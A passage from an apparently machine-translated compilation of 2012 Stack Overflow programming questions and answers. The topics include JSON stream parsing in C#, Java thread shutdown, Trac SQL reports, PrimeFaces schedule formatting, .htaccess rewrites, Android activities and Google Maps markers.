    }
} 
```

ETA：我现在从流中得到了 json 字符串。仍在试图弄清楚如何解析这个。JSON 字符串格式是我无法控制的，但我基本上需要获取“属性”节点。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T20:19:42.650

[这个答案](https://stackoverflow.com/a/5515894/351330)将为您指明如何将流写入文件的正确方向。您的情况下的流是[Request.InputStream](http://msdn.microsoft.com/en-us/library/system.web.httprequest.inputstream.aspx)，相当于`php://input`.

要处理 JSON 部分，请查看@YYY 的答案。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T20:20:31.960

如果我理解正确，这基本上就是您要尝试做的事情。但正如其他人提到的那样。JSON.NET 是更好的选择。

```
private void Request()
{
    //Makes Request
    HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create("http://localhost/Test.php");
    request.ContentType = "application/json; charset=utf-8";
    request.Accept = "application/json, text/javascript, */*";
    request.Method = "POST";
    using (StreamWriter writer = new StreamWriter(request.GetRequestStream()))
    {
        writer.Write("{id : 'test'}");
    }

    //Gets response
    WebResponse response = request.GetResponse();
    Stream stream = response.GetResponseStream();
    string json = "";
    using (StreamReader reader = new StreamReader(stream))
    {
        //Save it to text file
        using (TextWriter savetofile = new StreamWriter("C:/text.txt"))
        {
            while (!reader.EndOfStream)
            {
                string line = reader.ReadLine();
                savetofile.WriteLine(line);
                json += line;
            }
        }
    }

    //Decodes the JSON
    DataContractJsonSerializer dcjs = new DataContractJsonSerializer(typeof(MyCustomDict));
    MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(json));
    MyCustomDict dict = (MyCustomDict)dcjs.ReadObject(ms);

    //Do something with values.
    foreach(var key in dict.dict.Keys)
    {
        Console.WriteLine( key);
        foreach(var value in dict.dict[key])
        {
            Console.WriteLine("\t" + value);
        }
    }

}
[Serializable]
public class MyCustomDict : ISerializable
{
    public Dictionary<string, object[]> dict;
    public MyCustomDict()
    {
        dict = new Dictionary<string, object[]>();
    }
    protected MyCustomDict(SerializationInfo info, StreamingContext context)
    {
        dict = new Dictionary<string, object[]>();
        foreach (var entry in info)
        {
            object[] array = entry.Value as object[];
            dict.Add(entry.Name, array);
        }
    }
    public void GetObjectData(SerializationInfo info, StreamingContext context)
    {
        foreach (string key in dict.Keys)
        {
            info.AddValue(key, dict[key]);
        }
    }
} 
```

归功于[这个人](http://social.msdn.microsoft.com/Forums/en-US/wcf/thread/071f73bb-e141-4a68-ae61-05635382934f)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-26T19:45:42.273

.NET 的基础库没有任何真正好的方法来处理 JSON 输入。相反，请查看[Json.NET](http://james.newtonking.com/projects/json-net.aspx)，它是一个高性能的 3rd 方库，可满足此需求。

链接页面上有使用示例。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-26T20:27:34.173

既然你们这些无情的暴徒欺负我，我觉得至少有义务记录下我的进步。

```
 Using inputStream As New StreamReader(Request.InputStream)
        JSON = inputStream.ReadToEnd
        If JSON.Length > 0 Then
            Using writer As StreamWriter = New StreamWriter("c:\temp\out.txt")
                writer.Write(JSON)
            End Using
        End If
    End Using 
```

# java - @PersistenceContext 在抽象超类或每个具体子类中？

> ID：13093203
> 
> 赞同：0
> 
> 时间：2012-10-26T19:28:49.407
> 
> 标签：java, jakarta-ee, jpa

您是在抽象超类中添加`@PersistenceContext`注释，还是将其添加到每个具体的 SqlRepository 中，然后将引用传递给超类的构造函数？有什么优点/缺点吗？

```
@Stateless
public abstract class AbstractSqlRepository<T> implements Repository<T> {

    @PersistenceContext
    private EntityManager entityManager;
... 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T19:54:29.590

如果您有多个持久性单元，您可能希望重新考虑将实体管理器放在基类中。您将把所有子类耦合到同一个持久性单元。

就个人而言，我会将实体管理器定义为高于数据层的层。这将使您更好地控制交易。此外，如果您在父类中没有它，您可以使用不同的持久性单元。

# jquery - 如何将步长值增加 2

> ID：13093206
> 
> 赞同：0
> 
> 时间：2012-10-26T19:29:00.257
> 
> 标签：jquery

我有一个这样的数组

```
arr=["rose","AA","lotus","BB","Jasmine","CC",tulip,"DD"];

$.each(arr, function(topics,i){
             document.write(topics);
             document.write(i);           

            }) 
```

我想要像
玫瑰-AA lotus-BB Jasmine-CC tuplic-DD这样的东西打印

如何在使用 .each 时将索引增加 1？我尝试使用主题++，但它从未奏效。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T19:30:46.040

尝试一个简单的 for 循环。

```
arr=["rose","AA","lotus","BB","Jasmine","CC","tulip","DD"];
for (var i = 0; i < arr.length; i+=2) {
   document.write(arr[i] + "-" + arr[i+1] + ' ');
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T19:31:59.687

使用简单的 for 循环进行迭代。（我假设 arr 的长度总是偶数）

```
for(var i=0; i< arr.length; i = i+2){
         document.write(arr[i]+"-"+arr[i+1] + " ");

} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-26T19:32:38.270

```
 var arr = ["rose", "AA", "lotus", "BB", "Jasmine", "CC", "tulip", "DD"];

    for (var i = 0; i < arr.length; i += 2) {
        document.write(arr[i] + "-" + arr[i + 1] + ' ');
    } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-26T19:34:25.373

您可以跳过奇数索引：

```
$.each(arr, function(topics, i){
  if ((topics % 2) == 0) {
    document.write(topics);
    document.write(i);           
  }
}); 
```

演示：http: [//jsfiddle.net/Guffa/VT9tT/](http://jsfiddle.net/Guffa/VT9tT/)

# javascript - .setValue 元素/隐藏元素

> ID：13093212
> 
> 赞同：1
> 
> 时间：2012-10-26T19:29:26.930
> 
> 标签：javascript, google-apps-script, spreadsheet

```
function change(e){
var app = UiApp.getActiveApplication();  
app.getElementById("date").setValue(e.parameter.picker);  
Browser.msgBox(e.parameter.date+"|"+e.parameter.picker);  
return app;  
} 
```

我花了最后一个小时左右试图找出我做错了什么，但是 .setValue() 似乎不起作用，因为 Browser.msgBox 显示：“ | 2012 年 8 月 8 日 0:00:00 (MST)" 尽管双方都来自 | 应该显示相同的东西。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T22:45:31.423

在 GAS 的处理函数中为小部件分配值的正确方法很简单（就像您在问题中所做的那样），如下所示：

```
app.getElementById("date").setValue(e.parameter.picker) 
```

但是您的代码中的以下内容不起作用，因为**在调用处理程序函数时将值传递给 e.parameter**，而不是在处理程序执行期间。这意味着它`e`不会在处理函数内部更新，但它将在下一次调用时更新。

# jqgrid - 在 struts2-jquery-grid-plugin-3.3.3 中显示行明智的操作？

> ID：13093214
> 
> 赞同：0
> 
> 时间：2012-10-26T19:29:45.460
> 
> 标签：jqgrid, struts2

如何使用 struts2-jquery-grid-plugin-3.3.3 在网格的每一行中显示行操作，即编辑、删除。请检查图像![在此处输入图像描述](../Images/d5e1069ad7df3aa42bc6f46f613948f5.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-06T18:07:54.000

此问题已解决。我添加了 jquery.frmtter javascript 文件并将参数添加为 gridcolumn.ftl 中的操作。但这在当前版本的 struts2-jquery-grid 插件中没有实现。它对我有用

# sqlite - 在 Trac 自定义报告中包含关闭日期

> ID：13093221
> 
> 赞同：3
> 
> 时间：2012-10-26T19:30:02.113
> 
> 标签：sqlite, report, trac

我正在使用以下内容显示已关闭的票证，新关闭的票证位于顶部：

```
SELECT 
   p.value AS __color__,
   id AS ticket, 
   summary, 
   component,
   version,
   milestone,
   t.type AS type, 
   owner, 
   status,
   time AS created,
   changetime AS _changetime,
   description AS _description,
   reporter AS _reporter
  FROM ticket t
  LEFT JOIN enum p ON p.name = t.priority AND p.type = 'priority'
  WHERE status = 'closed'
  ORDER BY changetime DESC, time DESC, CAST(p.value AS integer), milestone, t.type, time 
```

以下是当前显示的列：

```
Ticket
Summary
Component
Version
Milestone
Type
Owner
Status
Created 
```

我想**将**关闭的日期添加到报告视图（可能还有第三列显示日期差异）。我该怎么办？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T19:33:13.260

要在报告视图上显示字段，而不仅仅是 RSS 提要，请从列名称中删除前导下划线。`changetime AS _changetime`是违规行；尝试将其更改为`changetime AS closed`. 注意：您可能必须像`datetime(changetime/1000000, 'unixepoch') AS closed`.

要获得日期差异，请尝试减去两列，每列都包含在对 SQLite`julianday`函数的调用中，例如`julianday('now') - julianday(changetime/1000000, 'unixepoch') AS closedago`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-29T20:37:49.123

添加**关闭**日期并不像我想象的那么简单。下面的例子会告诉你诀窍：

```
SELECT p.value AS __color__,
       ticket, summary, component, version, milestone, t.type, owner,
       t.time AS created,
       MAX(tc.time) as date
  FROM ticket_change tc
  LEFT JOIN ticket t ON tc.ticket=id
  LEFT JOIN enum p ON p.name = t.priority AND p.type = 'priority'
 WHERE field='status'
   AND newvalue='closed'
 GROUP by ticket
 ORDER BY tc.time DESC, t.time DESC, CAST(p.value AS integer), milestone, t.type 
```

您需要 'ticket_change' 数据库表上的 JOIN 和最后一个排序以可靠地获得*最后一个*关闭日期。

# java - 线程依赖 Java

> ID：13093223
> 
> 赞同：0
> 
> 时间：2012-10-26T19:30:08.827
> 
> 标签：java, multithreading

我有一个生成线程的主类，我们称它们为 MainClass 和 MyThread。

```
public class MainClass extends javax.swing.JFrame {
   int sharedVariable;
   MyThread threadInstance;
   public MainClass (){
      sharedVariable = 2;
      threadInstance = new MyThread(this);
      threadInstance.run();
   }

  public int getSharedVariable(){ return sharedVariable; }

  public static void main(String[] args){
    //begin main class
 }
} 

public class MyThread implements Runnable {

     MainClass class;
     public MyThread(MainClass main_class){
         this.main_class= main_class;
      }

     @Override
     public run(){

     while(this.main_class is still active){

      //grab status of sharedVariable and wait for x amount of time.
      }
     }
    } 
```

问题是我不知道如何实现 while 条件来检查 MainClass 实例是否还活着，如果是，它必须使用 this.main_class.getSharedVariable() 来获取 sharedVariable 的值，然后等待 x多少时间。MainClass 有 main 方法。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-26T19:32:45.970

我建议保留`Thread`实例，然后在方法退出`threadInstance.interrupt()`之前立即调用。`main(...)`

就像是：

```
 public static void main(String[] args){
    MainClass mainClass = new MainClass();
    try {
        ...
        // do main stuff here
        ...
    } finally {
        mainClass.threadInstance.interrupt();
    }
 } 
```

然后在你的线程中你会做：

```
 while(!Thread.currentThread().isInterrupted()){
     ...
 } 
```

您还想`InterruptedException`正确处理：

```
 try {
     Thread.sleep(1000);
 } catch (InterruptedException e) {
     // always a good pattern to re-interrupt the thread here
     Thread.currentThread().interrupt();
     // if we are interrupted quit
     return;
 } 
```

顺便说一句，在构造期间将对象的实例泄漏到另一个线程是*非常糟糕的形式：*

```
 new MyThread(this); 
```

See here: [Why shouldn't I use Thread.start() in the constructor of my class?](https://stackoverflow.com/questions/11834173/why-shouldnt-i-use-thread-start-in-the-constructor-of-my-class/11834276#11834276)

Also, you aren't starting a thread when you call `threadInstance.run();`. You are just running it in the current thread. You should use `threadInstance.start()` but not inside of the constructor like that.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T19:46:49.600

You can use `CountDownLatch` which is very convenient for such tasks as waiting other threads to finish some activity (you can change `Thread.sleep(...)` argument in main to, say, 12000L and see what happens):

```
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

class OtherThread extends Thread {
    private final CountDownLatch sharedLatch;

    OtherThread(CountDownLatch sharedLatch) {
        this.sharedLatch = sharedLatch;
    }

    @Override
    public void run() {
        boolean wokenByMain = false;
        try {
            wokenByMain = sharedLatch.await(10000L, TimeUnit.MILLISECONDS);
        } catch (InterruptedException e) {
            e.printStackTrace();
            return; // or not return, whatever makes more sense in your case
        }
        System.out.println("heh: " + wokenByMain);
    }
}
class SOSample {

    public static void main(String[] args) throws InterruptedException {
        CountDownLatch latch = new CountDownLatch(1);
        OtherThread otherThread = new OtherThread(latch);
        otherThread.start();
        System.out.println("Scheduled other thread to be started");
        Thread.sleep(1000L);
        System.out.println("going to release other thread");
        latch.countDown();
    }

} 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2015-09-15T20:49:54.263

```
public class MainClass extends JFrame implements Runnable {
  public static void main(String [] args) {
    final Thread t=new Thread(new MainClass() {
            public void run(){
              //something
            });
    Thread t2=new Thread(new MyThread() {
            public void run() {
              while(t.isAlive) {
                //something
              }
            }
    });
  }
} 
```

# java - Primefaces Schedule - 如何格式化列标题

> ID：13093228
> 
> 赞同：0
> 
> 时间：2012-10-26T19:30:40.083
> 
> 标签：java, jsf, primefaces

我正在尝试使用`p:schedule`，但列标题显示的格式如下：`EEE MM/dd`我真的需要切换到`EEE dd/MM`.

研究 primefaces 论坛和谷歌项目，我遇到了这个（和其他几个线程）：[http ://code.google.com/p/primefaces/issues/detail?id=2546](http://code.google.com/p/primefaces/issues/detail?id=2546)

这似乎解决了这个问题，但我不知道如何使用它来解决这个问题。

我不确定这个问题是否重复（因为这个问题已经存在了几年了），但是搜索 SO 并没有得到任何成功。

那么，如何更改列标题的格式？

我将展示示例导入到我的项目中，到目前为止，我的日程安排事件的配置是：

```
<p:schedule value="#{scheduleController.eventModel}"
widgetVar="myschedule" view="agendaWeek"     allDaySlot="false"
slotMinutes="15" firstHour="7" showWeekends="FALSE"
leftHeaderTemplate="prev,next" rightHeaderTemplate=""
minTime="7am" maxTime="21pm" timeFormat="dd/MM hh:mm"
axisFormat="HH"> 
```

使用素面 3.3.1

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-30T16:25:48.357

一个非常粗略的解决方案，我通过劫持计划页面的输出来修复这些标题，更改计划调用的 javascript 代码以便将格式放入其中：

我使用了 Jeremy Stein 编写的类[（点击进入问题）](https://stackoverflow.com/questions/5009650/where-can-i-find-a-java-servlet-filter-that-applies-regex-to-the-output)（是的，HTML 输出上的正则表达式，bash 上），并放置了一个过滤器来监听带有时间表的特定页面的输出。

我使用了以下模式和替换字符串：

```
Pattern. compile("timeFormat:(.*?), behaviors");

replaceString= "timeFormat: $1, columnFormat : { month : 'ddd' , week : 'ddd d/M' , day : 'dddd d/M' }, behaviors" 
```

通过在输出中插入 columnFormat 属性，它开始正确呈现标题。

我很想看到另一种方法来解决 Primefaces 不愿实施此功能的情况。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-30T18:23:04.860

我解决了它从primefaces（scheduler.js）破解javascript。只需在您的页面中添加此代码即可编辑日期格式：

```
if (PrimeFaces.widget.Schedule != undefined) {
PrimeFaces.widget.Schedule.prototype.init = function() {
     this.cfg.titleFormat = {
            month: 'MMMM yyyy',
            week: "De d MMM [ yyyy]{ 'à' d [ MMM] 'de' yyyy}",
            day: 'dddd, d MMM , yyyy'
     };          
     this.cfg.columnFormat = {
            month: 'ddd',
            week: 'ddd d/M',
            day: 'dddd M/d'
     };
     if(this.jq.is(':visible')) {
        this.jqc.fullCalendar(this.cfg);
        return true;
     }  else {
        return false;
     }
}; 
```

}

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-05-17T02:13:31.053

我通过破解“columnFormat”属性解决了这个问题。

```
columnFormat="month:'ddd', week:'dd/MM', day:'dd/MM/yyyy'}, titleFormat: {day: 'dddd, dd \'de\' MMMM \'de\' yyyy'" 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-08-12T08:07:21.323

使用最新版本的 primefaces，现在已经解决了这个问题。您只需在 p:schedule 标记中添加 columnFormat="ddd D/M"，如下所示：

```
<p:schedule value="#{scheduleController.eventModel}"
widgetVar="myschedule" view="agendaWeek"     allDaySlot="false"
slotMinutes="15" firstHour="7" showWeekends="FALSE"
leftHeaderTemplate="prev,next" rightHeaderTemplate=""
minTime="7am" maxTime="21pm" timeFormat="dd/MM hh:mm"
axisFormat="HH" columnFormat="ddd D/M"> 
```

# c# - 检查是否存在任何http查询，而不是通过参数

> ID：13093236
> 
> 赞同：0
> 
> 时间：2012-10-26T19:31:11.540
> 
> 标签：c#, asp.net-mvc, asp.net-mvc-3, razor, webgrid

由于 MVC3 WebGrid 排序默认是通过查询字符串升序，&sortdir=ASC.. 我想知道如何通过降序进行初始排序。

我在下面尝试过，使用 Request.QueryString，但在绝对没有查询字符串“？..”的情况下，这看不到，正在工作：

```
// Force a descending sort on page load when query string is empty
if(Request.QueryString[grid.SortDirectionFieldName].IsEmpty()){
    grid.SortDirection = SortDirection.Descending;
} 
```

由于我最初有类似 ..Admin/Review 的路径，而不是 ../Admin/Review?sort=Question6&sortdir=ASC，我该如何测试这种情况？如果甚至没有查询参数，上述条件是否仍会返回 true？

我相信我需要从原始 url 中提取一个查询，如果它不存在，请将我的排序方向设置为降序。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-26T20:07:11.230

您可能需要将 if 语句更改为：

```
 if( string.IsNullOrEmpty(Request.QueryString[grid.SortDirectionFieldName]) ){
     //sort desc
 } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T20:04:23.633

这行得通吗？除非查询字符串变量显式为“ASC”，否则它将默认为降序。

```
 if (Request.QueryString[grid.SortDirectionFieldName] == "ASC")
        {
            grid.SortDirection = SortDirection.Ascending;
        }
        else
        {
            grid.SortDirection = SortDirection.Descending;
        } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-26T21:29:06.047

最终使用JS：

```
$(document).ready(function () {
    var ignoreURL = window.location.href.replace('DESC', 'ASC');
    $('#grid th a').each(function () {
        if (this.href.indexOf('ASC') > -1 && this.href != ignoreURL) {
            this.href = this.href.replace('ASC', 'DESC');
        }
    });
}); 
```

# php - 从 URL .htaccess 中删除查询

> ID：13093241
> 
> 赞同：0
> 
> 时间：2012-10-26T19:31:30.750
> 
> 标签：php, mysql

所以我已经成功地从 .htaccess 文件中的 url 中删除了数据库查询：

```
RewriteRule ^([A-Za-z0-9-]+)$ /page.php?page_url=$1 
```

但是，现在每个请求都转到此页面。这会产生问题：

(1) 不存在的页面请求转到此页面而不是error404.html，所以我在页面中写道：

```
<?php if ($row ['page_url'] == '') { header( 'Location: http://www.mysite.com/error404.html' ); } ?> 
```

（2）其他页面查询剥离不起作用，重定向到error404.html：

```
RewriteRule ^([A-Za-z0-9-]+)$ /database.php?database_url=$1 
```

(3) 页面转到先出现的 RewriteRule：

```
RewriteRule ^([A-Za-z0-9-]+)$ /page.php?page_url=$1
RewriteRule ^([A-Za-z0-9-]+)$ /database.php?database_url=$1 
```

通过上面的重写，数据库请求转到“page.php”文档，而不是“database.php”

# android - Android StartActivityForResult 没有开始活动？

> ID：13093247
> 
> 赞同：2
> 
> 时间：2012-10-26T19:32:08.797
> 
> 标签：android, android-activity

我正在开发一个自动发送大量电子邮件的应用程序，但我无法获得允许用户选择文件开始的活动。代码中的一切似乎都是正确的，但是当我逐步执行说明时，似乎该活动根本没有开始。这是我的代码：

通话活动，EmailSender：

```
public class EmailSender extends Activity{
//declarations
Intent fileIntent;

    @Override
    public void onCreate(Bundle savedInstanceState) {

    //instantiations
    String pathName;
    fileIntent = new Intent(EmailSender.this, FileChooser.class);

    //email sending functions that work fine

    try {
        GmailSender attachmentSender = new GmailSender(gsn, gpw)

        String[] toArr = new String[6];    //array of recipient addresses
        toArr[0] = efull;
        toArr[1] = afull;
        toArr[2] = ysn;
        toArr[3] = csn;
        toArr[4] = hsn;
        toArr[5] = gsn;     

        attachmentSender.setSubject("Attachment Download Test");
        attachmentSender.setFrom(gsn);
        attachmentSender.setTo(toArr);
        attachmentSender.setBody("Attachment Downloading Test");

        startActivityForResult(fileIntent, 1);
        attachmentSender.addAttachment(pathName);
        attachmentSender.send();
    }
    catch (Exception e) {
        Log.e("EmailSender", e.getMessage(), e);
    }
    finish();

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data)
    {
        if(requestCode == 1)
        {
            if(resultCode == RESULT_OK)
                pathName = data.getStringExtra("result");
        }
        if(resultCode == RESULT_CANCELED)
        {
            pathName = "";
        }
    }
} 
```

文件选择器来自这个问题中发布的库：[Android 文件选择器](https://stackoverflow.com/questions/7856959/android-file-chooser)

下面仅发布扩展文件选择器的类的相关方法：

```
public class FileChooser extends FileChooserActivity    {

    // TAG for log messages.
    private static final String TAG = "FileSelectorTestActivity";

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // We must check to ensure that the calling Intent is not Intent.ACTION_GET_CONTENT
        if (!isIntentGetContent()) {
            // Display the file chooser with all file types
            showFileChooser();
        }
    }

    @Override
    protected void onFileSelect(File file) {
        if (file != null) {
            //final Context context = getApplicationContext();

            // Get the path of the Selected File.
            final String path = file.getAbsolutePath();
            Log.d(TAG, "File path: " + path);

            Intent returnIntent = new Intent();
            returnIntent.putExtra("result", path);
            setResult(RESULT_OK, returnIntent);   
            finish();
        }   
    }
} 
```

最后，这是我的清单的片段，其中声明了被调用的类：

```
<activity
    android:name=".FileChooser"
    android:label="Choose a file"
    android:exported="false" >
        <intent-filter>
            <action android:name="android.intent.action.GET_CONTENT" />

            <category android:name="android.intent.category.DEFAULT" />
            <category android:name="android.intent.category.OPENABLE" />

            <data android:mimeType="*/*" />
        </intent-filter>
</activity> 
```

在 EmailSender 尝试附加空文件名之前，我在 Logcat 中没有任何异常。调试器几乎只是逐步执行来自 Android API 的指令，直到它返回到 EmailSender 活动并从中断处继续。我唯一有可能选择文件的迹象是，一旦抛出并记录了异常并且代码在完成（）之后暂停。此时，会打开一个弹出窗口，要求选择一个文件选择程序（应该发生的是自动使用内置文件选择器）。

如果有人可以帮助我了解发生了什么以及为什么 FileChooser 活动没有被首先调用，我将不胜感激。我找到了很多关于 OnActivityResult() 问题的资源，但不幸的是，它甚至没有走那么远。谢谢你的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T20:02:54.667

嗯，在你的 try catch 块之后，你就完成了这个活动。删除这`finish()`条线，这样你就可以`startActivityForResult`有一些东西可以回来了。

# drop-down-menu - 引导下拉元素未对齐中心

> ID：13093250
> 
> 赞同：0
> 
> 时间：2012-10-26T19:32:19.737
> 
> 标签：drop-down-menu, twitter-bootstrap

所以我有一个包含四个按钮的按钮组，第三个有一个下拉菜单，但我似乎无法将其居中对齐。按钮居中，但下拉菜单左对齐。我尝试了各种 css，但没有任何效果。也许有人可以帮忙。:)

HTML：

```
<div class="btn-group">
  <a href="#" class="btn btn-info btn-large active">Home</a>
  <a href="#" class="btn btn-info btn-large">Link</a>
  <a href="#" class="btn btn-info btn-large dropdown-toggle" data-toggle="dropdown">   <span class="caret"></span></a>
 <ul class="dropdown-menu">
   <li><a href="#">Linkk1</a></li>
   <li><a href="#">Linkk2</a></li>
   <li><a href="#">Linkk3</a></li>
</ul>
 <a href="#" class="btn btn-info btn-large">Link</a>
</div> 
```

这是我对齐按钮组中心的方法：

```
.btn-group {
 margin: 0 auto; 
 text-align: center;
 font-size:0 !important;
}
.btn-group a {
 display:inline-block;
} 
```

我曾尝试对下拉菜单使用相同的方法，但没有运气。请帮忙。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-29T11:18:17.587

尝试将按钮组包装在居中的 btn-toolbar 容器中。

```
<div class="btn-toolbar">
  <div class="btn-group">
    ...
  </div>
</div>

.btn-toolbar {
  text-align:center;
} 
```

工作示例：http: [//jsfiddle.net/r26Zz/](http://jsfiddle.net/r26Zz/)

# variables - 期望：检查期望响应中变量的响应的简单方法

> ID：13093258
> 
> 赞同：1
> 
> 时间：2012-10-26T19:32:50.327
> 
> 标签：variables, response, expect

我正在寻找是否有一种简单的方法来确定类似于下面的期望响应中是否存在已加载的变量。（注意 $sb 已关闭）

```
expect {
    "some text\rsome text = $sb\rsome text = $sb\r# " {
        id $sb
        version
        id $sb
        thermometer $eFile
        finish $eFile
    }
    "some text\rsome text = $sb\r# "    {
        id $sb
        update
        enum 2 $sb $eFile
    }
} 
```

正如您可能想象的那样，这只是脚本的一部分，if 中的所有调用都是 proc。我希望能够拥有与此类似的东西，而不是必须手动创建足够的响应来处理响应的变体。结果将与此类似，只是跟踪时间更长，更痛苦：

```
expect {
    "some text\rsome text = 2\rsome text = 2\r# " {
        if { $sb == 2 } {
            id $sb
            version
            id $sb
            thermometer $eFile
            finish $eFile
        } else {
            assign $sb $eFile
            enum 1 $sb $eFile
        }

    }
    "some text\rsome text = 3\r# "  {
        if { $sb == 3 } {
            id $sb
            update
            enum 2 $sb $eFile
        } else {
            assign $sb $eFile
            enum 1 $sb $eFile
        }
    }
} 
```

'some text' 响应是相同的，因此至少可以说通过修剪进行过滤很有趣。我已经建立了大部分，但如果可以的话，我想避免它。此外，对于 2/3 显示，它们可以切换，因此具有 2 个变量的响应可以具有 3，具有 1 个变量的响应也可以具有 2，因此很明显这可能会很快变大。

# android - 什么是 com.sec.android.intent.action.DVFS_BOOSTER，是什么原因造成的？

> ID：13093259
> 
> 赞同：2
> 
> 时间：2012-10-26T19:32:57.270
> 
> 标签：android, android-intent

我刚刚在带有 4.0.4 的三星 Galaxy Tab 2 的 LogCat 中发现以下警告：

```
10-26 20:29:27.456: W/ActivityManager(217): Permission Denial: broadcasting Intent 
{ act=com.sec.android.intent.action.DVFS_BOOSTER flg=0x10 (has extras) } from
de.vsbsoft.schadenserfassung.android (pid=27302, uid=10016) requires 
com.sec.android.app.twdvfs.DVFS_BOOSTER_PERMISSION due to receiver 
com.sec.android.app.twdvfs/com.sec.android.app.twdvfs.TwDVFSBroadcastReceiver 
```

我只是在 developer.android 和 stackoverflow.com 上都没有找到它。即使[在 Google 上进行搜索](https://www.google.de/#hl=de&biw=1280&bih=677&sclient=psy-ab&q=dvfs_booster&oq=dvfs_booster&gs_l=hp.3..0i10i19.1313.3882.0.4321.12.12.0.0.0.0.316.2703.0j7j2j3.12.0...0.0...1c.1.GGE0OMg4pFM&pbx=1&bav=on.2,or.r_gc.r_pw.r_qf.&fp=f432d6e564c9b0a9&bpcl=35466521)也没有发现它是什么。奇怪的是，那里的一些顶级结果与我不使用的 Phonegap 相关。

我的 web 应用程序只有一个 WebView 来提供 PDF 生成和其他一些简单的东西。所以我认为这与我所做的任何设置有关。通过包 com.sec 猜测，它似乎与某些安全功能有关。但到底代表`(tw)dvfs`什么？文件系统**有**什么**问题**？

 **据我所知，警告对我的应用没有影响，但日志显示我的应用正在请求它。所以我必须知道它从哪里来，它意味着什么，如果它是智能的，如果是，它是否友好？

开个玩笑：我希望其中一位大师可以让我稍微了解一下那个涅槃。我只是没有时间注释掉我的每一行代码，直到我在一个抓草堆里找到那根针。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-06-27T19:55:11.843

我不能完全回答你的问题，但关于 DVFS 是什么：

> 摘要：动态电压和频率缩放（DVFS）是降低嵌入式微处理器功耗的有前途的技术[1](http://os.korea.ac.kr/publication_papers/domestic_confer/IEMEK_thlee.pdf). 由于在性能和功耗之间存在权衡，因此在实际嵌入式系统中使用DVFS时应考虑系统的性能需求。因此，DVFS 被限制在具有明确性能需求和执行期限的实时任务中。智能手机采用的DVFS策略是按需的。当 CPU 的工作负载发生变化时，按需策略会更改 CPU 频率和电压。本文建议安卓设备的电源管理策略。它根据应用程序的工作负载特性来控制系统频率。为此，请实现 android 媒体播放器应用程序。当改变它的工作负载时，它会向内核请求 DVFS

[链接到带有上述摘要的论文*](http://os.korea.ac.kr/publication_papers/domestic_confer/IEMEK_thlee.pdf)

*论文是韩文...**

# google-maps-api-3 - 谷歌地图，向数组和正文添加更多标记

> ID：13093261
> 
> 赞同：0
> 
> 时间：2012-10-26T19:33:01.933
> 
> 标签：google-maps-api-3, google-maps-markers

我将如何为这个设置添加额外的标记？目前有三个，我一直在搞乱它，但我不知道如何继续向它添加标记

我也在这个 JS Bin 上尝试过[http://jsbin.com/agemuw/2/edit](http://jsbin.com/agemuw/2/edit)但还没有成功

JS：

```
<script type='text/javascript'>//<![CDATA[ 
$(window).load(function(){
var locations = [
[
"850 Boylston Street",
"Chestnut Hill, MA 02467",
"42.326435",
"-71.149499"
],
[
"Subway Brookline Village",
"Green Line, D",
"42.33279",
"-71.11630"
],
[
"Shuttle Brookline Village",
"10 Brookline Place",
"42.33262",
"-71.116439"
]
];

gmarkers = [];

var map = new google.maps.Map(document.getElementById('map'), {
zoom: 16,
center: new google.maps.LatLng(42.326435, -71.149499),
mapTypeId: google.maps.MapTypeId.ROADMAP
});

var infowindow = new google.maps.InfoWindow();

function createMarker(latlng, html) {
var marker = new google.maps.Marker({
    position: latlng,
    map: map
});

google.maps.event.addListener(marker, 'click', function() {
    infowindow.setContent(html);
    infowindow.open(map, marker);
});
return marker;
}

for (var i = 0; i < locations.length; i++) {
/*    alert("location:"+
      locations[i][0]+":"+locations[i][2]+","+locations[i][3]);
*/
gmarkers[locations[i][0]]=
createMarker(new google.maps.LatLng(locations[i][2], locations[i][3]), locations[i][0]    
+ "<br>" + locations[i][1]);
}

/*                                                    
$(function() {
$('#locations h3 a').each(function() { 
    $(this).on('click', function() { 
        google.maps.event.trigger(marker, 'click');    
    })    
  });    
});

*/
});//]]> 
```

html:

```
<body>      
    <div id="map" style="width: 500px; height: 400px;"></div>

    <div id="locations">
        <h3><a href="javascript:google.maps.event.trigger(gmarkers['850 Boylston  
Street'],'click');">850 Boylston Street</a></h3>
        <p>Arbitrary content about 1</p>

        <h3><a href="javascript:google.maps.event.trigger(gmarkers['Subway Brookline 
Village'],'click');">Brookline Village T Stop</a></h3>
        <p>Arbitrary content about 2</p>

        <h3><a href="javascript:google.maps.event.trigger(gmarkers['Shuttle Brookline 
Village'],'click');">Shuttle - 10 Brookline Place</a></h3>
        <p>Arbitrary content about 3</p>

    </div>

</body> 
```

